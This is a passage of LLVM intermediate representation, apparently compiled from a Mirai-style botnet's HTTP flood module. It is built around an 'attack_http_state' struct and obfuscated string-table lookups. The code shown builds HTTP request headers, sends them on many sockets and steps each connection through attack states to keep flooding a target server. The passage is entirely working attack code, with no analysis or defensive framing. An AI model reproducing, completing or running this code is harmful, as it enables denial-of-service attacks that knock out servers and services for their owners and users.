  %471 = getelementptr inbounds [16 x i64], [16 x i64]* %465, i64 0, i64 %470
  %472 = load i64, i64* %471, align 8
  %473 = or i64 %472, %464
  store i64 %473, i64* %471, align 8
  %474 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %475 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %474, i32 0, i32 0
  %476 = load i32, i32* %475, align 4
  %477 = load i32, i32* %23, align 4
  %478 = icmp sgt i32 %476, %477
  br i1 %478, label %479, label %484

; <label>:479:                                    ; preds = %422
  %480 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %481 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 4
  %483 = add nsw i32 %482, 1
  store i32 %483, i32* %23, align 4
  br label %484

; <label>:484:                                    ; preds = %479, %422
  br label %943

; <label>:485:                                    ; preds = %399
  %486 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %487 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %486, i32 0, i32 1
  %488 = load i8, i8* %487, align 4
  %489 = zext i8 %488 to i32
  %490 = icmp eq i32 %489, 2
  br i1 %490, label %491, label %534

; <label>:491:                                    ; preds = %485
  %492 = load i32, i32* %27, align 4
  %493 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %494 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %493, i32 0, i32 2
  %495 = load i32, i32* %494, align 4
  %496 = sub i32 %492, %495
  %497 = icmp ugt i32 %496, 30
  br i1 %497, label %498, label %507

; <label>:498:                                    ; preds = %491
  %499 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %500 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %499, i32 0, i32 1
  store i8 0, i8* %500, align 4
  %501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %501, i32 0, i32 0
  %503 = load i32, i32* %502, align 4
  %504 = call i32 @close(i32 %503)
  %505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %505, i32 0, i32 0
  store i32 -1, i32* %506, align 4
  br label %944

; <label>:507:                                    ; preds = %491
  %508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %508, i32 0, i32 0
  %510 = load i32, i32* %509, align 4
  %511 = srem i32 %510, 64
  %512 = zext i32 %511 to i64
  %513 = shl i64 1, %512
  %514 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %515 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %516 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %515, i32 0, i32 0
  %517 = load i32, i32* %516, align 4
  %518 = sdiv i32 %517, 64
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds [16 x i64], [16 x i64]* %514, i64 0, i64 %519
  %521 = load i64, i64* %520, align 8
  %522 = or i64 %521, %513
  store i64 %522, i64* %520, align 8
  %523 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %523, i32 0, i32 0
  %525 = load i32, i32* %524, align 4
  %526 = load i32, i32* %23, align 4
  %527 = icmp sgt i32 %525, %526
  br i1 %527, label %528, label %533

; <label>:528:                                    ; preds = %507
  %529 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %529, i32 0, i32 0
  %531 = load i32, i32* %530, align 4
  %532 = add nsw i32 %531, 1
  store i32 %532, i32* %23, align 4
  br label %533

; <label>:533:                                    ; preds = %528, %507
  br label %942

; <label>:534:                                    ; preds = %485
  %535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %535, i32 0, i32 1
  %537 = load i8, i8* %536, align 4
  %538 = zext i8 %537 to i32
  %539 = icmp eq i32 %538, 4
  br i1 %539, label %540, label %814

; <label>:540:                                    ; preds = %534
  %541 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %542 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %541, i32 0, i32 14
  store i32 -1, i32* %542, align 4
  %543 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %544 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %543, i32 0, i32 11
  store i32 0, i32* %544, align 4
  %545 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %546 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %545, i32 0, i32 18
  %547 = getelementptr inbounds [1024 x i8], [1024 x i8]* %546, i32 0, i32 0
  call void @util_zero(i8* %547, i32 1024)
  %548 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %549 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %548, i32 0, i32 17
  store i32 0, i32* %549, align 4
  %550 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %550, i32 10240)
  %551 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %552 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %553 = call i32 @util_strlen(i8* %552)
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds i8, i8* %551, i64 %554
  %556 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %556, i32 0, i32 9
  %558 = getelementptr inbounds [9 x i8], [9 x i8]* %557, i32 0, i32 0
  %559 = call i32 @util_strcpy(i8* %555, i8* %558)
  %560 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %561 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %562 = call i32 @util_strlen(i8* %561)
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds i8, i8* %560, i64 %563
  %565 = call i32 @util_strcpy(i8* %564, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %566 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %567 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %568 = call i32 @util_strlen(i8* %567)
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds i8, i8* %566, i64 %569
  %571 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %571, i32 0, i32 6
  %573 = getelementptr inbounds [257 x i8], [257 x i8]* %572, i32 0, i32 0
  %574 = call i32 @util_strcpy(i8* %570, i8* %573)
  %575 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %576 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %577 = call i32 @util_strlen(i8* %576)
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds i8, i8* %575, i64 %578
  %580 = call i32 @util_strcpy(i8* %579, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %581 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %582 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %583 = call i32 @util_strlen(i8* %582)
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds i8, i8* %581, i64 %584
  %586 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %587 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %586, i32 0, i32 5
  %588 = getelementptr inbounds [512 x i8], [512 x i8]* %587, i32 0, i32 0
  %589 = call i32 @util_strcpy(i8* %585, i8* %588)
  %590 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %591 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %592 = call i32 @util_strlen(i8* %591)
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds i8, i8* %590, i64 %593
  %595 = call i32 @util_strcpy(i8* %594, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %596 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %597 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %598 = call i32 @util_strlen(i8* %597)
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds i8, i8* %596, i64 %599
  %601 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %602 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %601, i32 0, i32 7
  %603 = getelementptr inbounds [129 x i8], [129 x i8]* %602, i32 0, i32 0
  %604 = call i32 @util_strcpy(i8* %600, i8* %603)
  %605 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %606 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %607 = call i32 @util_strlen(i8* %606)
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds i8, i8* %605, i64 %608
  %610 = call i32 @util_strcpy(i8* %609, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %611 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %612 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %613 = call i32 @util_strlen(i8* %612)
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds i8, i8* %611, i64 %614
  %616 = call i8* @table_retrieve_val(i32 39, i32* null)
  %617 = call i32 @util_strcpy(i8* %615, i8* %616)
  call void @table_lock_val(i8 zeroext 39)
  %618 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %619 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %620 = call i32 @util_strlen(i8* %619)
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds i8, i8* %618, i64 %621
  %623 = call i32 @util_strcpy(i8* %622, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %624 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %625 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %626 = call i32 @util_strlen(i8* %625)
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds i8, i8* %624, i64 %627
  %629 = call i8* @table_retrieve_val(i32 40, i32* null)
  %630 = call i32 @util_strcpy(i8* %628, i8* %629)
  call void @table_lock_val(i8 zeroext 40)
  %631 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %632 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %633 = call i32 @util_strlen(i8* %632)
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds i8, i8* %631, i64 %634
  %636 = call i32 @util_strcpy(i8* %635, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %637 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %638 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %639 = call i32 @util_strlen(i8* %638)
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds i8, i8* %637, i64 %640
  %642 = call i8* @table_retrieve_val(i32 41, i32* null)
  %643 = call i32 @util_strcpy(i8* %641, i8* %642)
  call void @table_lock_val(i8 zeroext 41)
  %644 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %645 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %646 = call i32 @util_strlen(i8* %645)
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds i8, i8* %644, i64 %647
  %649 = call i32 @util_strcpy(i8* %648, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %650 = load i8*, i8** %14, align 8
  %651 = icmp ne i8* %650, null
  br i1 %651, label %652, label %693

; <label>:652:                                    ; preds = %540
  call void @table_unlock_val(i8 zeroext 42)
  %653 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %654 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %655 = call i32 @util_strlen(i8* %654)
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds i8, i8* %653, i64 %656
  %658 = call i8* @table_retrieve_val(i32 42, i32* null)
  %659 = call i32 @util_strcpy(i8* %657, i8* %658)
  call void @table_lock_val(i8 zeroext 42)
  %660 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %661 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %662 = call i32 @util_strlen(i8* %661)
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds i8, i8* %660, i64 %663
  %665 = call i32 @util_strcpy(i8* %664, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %666 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %667 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %668 = call i32 @util_strlen(i8* %667)
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds i8, i8* %666, i64 %669
  %671 = call i8* @table_retrieve_val(i32 47, i32* null)
  %672 = call i32 @util_strcpy(i8* %670, i8* %671)
  %673 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %674 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %675 = call i32 @util_strlen(i8* %674)
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds i8, i8* %673, i64 %676
  %678 = call i32 @util_strcpy(i8* %677, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %679 = load i8*, i8** %14, align 8
  %680 = call i32 @util_strlen(i8* %679)
  %681 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %682 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %683 = call i32 @util_strlen(i8* %682)
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds i8, i8* %681, i64 %684
  %686 = call i8* @util_itoa(i32 %680, i32 10, i8* %685)
  %687 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %688 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %689 = call i32 @util_strlen(i8* %688)
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds i8, i8* %687, i64 %690
  %692 = call i32 @util_strcpy(i8* %691, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %693

; <label>:693:                                    ; preds = %652, %540
  %694 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %695 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %694, i32 0, i32 15
  %696 = load i32, i32* %695, align 4
  %697 = icmp sgt i32 %696, 0
  br i1 %697, label %698, label %740

; <label>:698:                                    ; preds = %693
  %699 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %700 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %701 = call i32 @util_strlen(i8* %700)
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds i8, i8* %699, i64 %702
  %704 = call i32 @util_strcpy(i8* %703, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %705

; <label>:705:                                    ; preds = %730, %698
  %706 = load i32, i32* %10, align 4
  %707 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %708 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %707, i32 0, i32 15
  %709 = load i32, i32* %708, align 4
  %710 = icmp slt i32 %706, %709
  br i1 %710, label %711, label %733

; <label>:711:                                    ; preds = %705
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %713 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %714 = call i32 @util_strlen(i8* %713)
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds i8, i8* %712, i64 %715
  %717 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %718 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %717, i32 0, i32 16
  %719 = load i32, i32* %10, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %718, i64 0, i64 %720
  %722 = getelementptr inbounds [128 x i8], [128 x i8]* %721, i32 0, i32 0
  %723 = call i32 @util_strcpy(i8* %716, i8* %722)
  %724 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %725 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %726 = call i32 @util_strlen(i8* %725)
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds i8, i8* %724, i64 %727
  %729 = call i32 @util_strcpy(i8* %728, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %730

; <label>:730:                                    ; preds = %711
  %731 = load i32, i32* %10, align 4
  %732 = add nsw i32 %731, 1
  store i32 %732, i32* %10, align 4
  br label %705

; <label>:733:                                    ; preds = %705
  %734 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %735 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %736 = call i32 @util_strlen(i8* %735)
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds i8, i8* %734, i64 %737
  %739 = call i32 @util_strcpy(i8* %738, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %740

; <label>:740:                                    ; preds = %733, %693
  %741 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %742 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %743 = call i32 @util_strlen(i8* %742)
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds i8, i8* %741, i64 %744
  %746 = call i32 @util_strcpy(i8* %745, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %747 = load i8*, i8** %14, align 8
  %748 = icmp ne i8* %747, null
  br i1 %748, label %749, label %757

; <label>:749:                                    ; preds = %740
  %750 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %751 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %752 = call i32 @util_strlen(i8* %751)
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds i8, i8* %750, i64 %753
  %755 = load i8*, i8** %14, align 8
  %756 = call i32 @util_strcpy(i8* %754, i8* %755)
  br label %757

; <label>:757:                                    ; preds = %749, %740
  %758 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %759 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %758, i32 0, i32 9
  %760 = getelementptr inbounds [9 x i8], [9 x i8]* %759, i32 0, i32 0
  %761 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %762 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %761, i32 0, i32 10
  %763 = getelementptr inbounds [9 x i8], [9 x i8]* %762, i32 0, i32 0
  %764 = call signext i8 @util_strcmp(i8* %760, i8* %763)
  %765 = icmp ne i8 %764, 0
  br i1 %765, label %774, label %766

; <label>:766:                                    ; preds = %757
  %767 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %768 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %767, i32 0, i32 9
  %769 = getelementptr inbounds [9 x i8], [9 x i8]* %768, i32 0, i32 0
  %770 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %771 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %770, i32 0, i32 10
  %772 = getelementptr inbounds [9 x i8], [9 x i8]* %771, i32 0, i32 0
  %773 = call i32 @util_strcpy(i8* %769, i8* %772)
  br label %774

; <label>:774:                                    ; preds = %766, %757
  %775 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %776 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %775, i32 0, i32 0
  %777 = load i32, i32* %776, align 4
  %778 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %779 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %780 = call i32 @util_strlen(i8* %779)
  %781 = sext i32 %780 to i64
  %782 = call i64 @send(i32 %777, i8* %778, i64 %781, i32 16384)
  %783 = load i32, i32* %27, align 4
  %784 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %785 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %784, i32 0, i32 3
  store i32 %783, i32* %785, align 4
  %786 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %787 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %786, i32 0, i32 1
  store i8 6, i8* %787, align 4
  %788 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %789 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %788, i32 0, i32 0
  %790 = load i32, i32* %789, align 4
  %791 = srem i32 %790, 64
  %792 = zext i32 %791 to i64
  %793 = shl i64 1, %792
  %794 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %795 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %796 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %795, i32 0, i32 0
  %797 = load i32, i32* %796, align 4
  %798 = sdiv i32 %797, 64
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds [16 x i64], [16 x i64]* %794, i64 0, i64 %799
  %801 = load i64, i64* %800, align 8
  %802 = or i64 %801, %793
  store i64 %802, i64* %800, align 8
  %803 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %804 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %803, i32 0, i32 0
  %805 = load i32, i32* %804, align 4
  %806 = load i32, i32* %23, align 4
  %807 = icmp sgt i32 %805, %806
  br i1 %807, label %808, label %813

; <label>:808:                                    ; preds = %774
  %809 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %810 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %809, i32 0, i32 0
  %811 = load i32, i32* %810, align 4
  %812 = add nsw i32 %811, 1
  store i32 %812, i32* %23, align 4
  br label %813

; <label>:813:                                    ; preds = %808, %774
  br label %941

; <label>:814:                                    ; preds = %534
  %815 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %816 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %815, i32 0, i32 1
  %817 = load i8, i8* %816, align 4
  %818 = zext i8 %817 to i32
  %819 = icmp eq i32 %818, 6
  br i1 %819, label %820, label %847

; <label>:820:                                    ; preds = %814
  %821 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %822 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %821, i32 0, i32 0
  %823 = load i32, i32* %822, align 4
  %824 = srem i32 %823, 64
  %825 = zext i32 %824 to i64
  %826 = shl i64 1, %825
  %827 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %828 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %829 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %828, i32 0, i32 0
  %830 = load i32, i32* %829, align 4
  %831 = sdiv i32 %830, 64
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds [16 x i64], [16 x i64]* %827, i64 0, i64 %832
  %834 = load i64, i64* %833, align 8
  %835 = or i64 %834, %826
  store i64 %835, i64* %833, align 8
  %836 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %837 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %836, i32 0, i32 0
  %838 = load i32, i32* %837, align 4
  %839 = load i32, i32* %23, align 4
  %840 = icmp sgt i32 %838, %839
  br i1 %840, label %841, label %846

; <label>:841:                                    ; preds = %820
  %842 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %842, i32 0, i32 0
  %844 = load i32, i32* %843, align 4
  %845 = add nsw i32 %844, 1
  store i32 %845, i32* %23, align 4
  br label %846

; <label>:846:                                    ; preds = %841, %820
  br label %940

; <label>:847:                                    ; preds = %814
  %848 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %849 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %848, i32 0, i32 1
  %850 = load i8, i8* %849, align 4
  %851 = zext i8 %850 to i32
  %852 = icmp eq i32 %851, 7
  br i1 %852, label %853, label %880

; <label>:853:                                    ; preds = %847
  %854 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %855 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %854, i32 0, i32 0
  %856 = load i32, i32* %855, align 4
  %857 = srem i32 %856, 64
  %858 = zext i32 %857 to i64
  %859 = shl i64 1, %858
  %860 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %861 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %862 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %861, i32 0, i32 0
  %863 = load i32, i32* %862, align 4
  %864 = sdiv i32 %863, 64
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds [16 x i64], [16 x i64]* %860, i64 0, i64 %865
  %867 = load i64, i64* %866, align 8
  %868 = or i64 %867, %859
  store i64 %868, i64* %866, align 8
  %869 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %870 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %869, i32 0, i32 0
  %871 = load i32, i32* %870, align 4
  %872 = load i32, i32* %23, align 4
  %873 = icmp sgt i32 %871, %872
  br i1 %873, label %874, label %879

; <label>:874:                                    ; preds = %853
  %875 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %876 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %875, i32 0, i32 0
  %877 = load i32, i32* %876, align 4
  %878 = add nsw i32 %877, 1
  store i32 %878, i32* %23, align 4
  br label %879

; <label>:879:                                    ; preds = %874, %853
  br label %939

; <label>:880:                                    ; preds = %847
  %881 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %882 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %881, i32 0, i32 1
  %883 = load i8, i8* %882, align 4
  %884 = zext i8 %883 to i32
  %885 = icmp eq i32 %884, 10
  br i1 %885, label %886, label %913

; <label>:886:                                    ; preds = %880
  %887 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %888 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %887, i32 0, i32 0
  %889 = load i32, i32* %888, align 4
  %890 = srem i32 %889, 64
  %891 = zext i32 %890 to i64
  %892 = shl i64 1, %891
  %893 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %894 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %895 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %894, i32 0, i32 0
  %896 = load i32, i32* %895, align 4
  %897 = sdiv i32 %896, 64
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds [16 x i64], [16 x i64]* %893, i64 0, i64 %898
  %900 = load i64, i64* %899, align 8
  %901 = or i64 %900, %892
  store i64 %901, i64* %899, align 8
  %902 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %903 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %902, i32 0, i32 0
  %904 = load i32, i32* %903, align 4
  %905 = load i32, i32* %23, align 4
  %906 = icmp sgt i32 %904, %905
  br i1 %906, label %907, label %912

; <label>:907:                                    ; preds = %886
  %908 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %909 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %908, i32 0, i32 0
  %910 = load i32, i32* %909, align 4
  %911 = add nsw i32 %910, 1
  store i32 %911, i32* %23, align 4
  br label %912

; <label>:912:                                    ; preds = %907, %886
  br label %938

; <label>:913:                                    ; preds = %880
  %914 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %914, i32 0, i32 1
  %916 = load i8, i8* %915, align 4
  %917 = zext i8 %916 to i32
  %918 = icmp eq i32 %917, 11
  br i1 %918, label %919, label %928

; <label>:919:                                    ; preds = %913
  %920 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
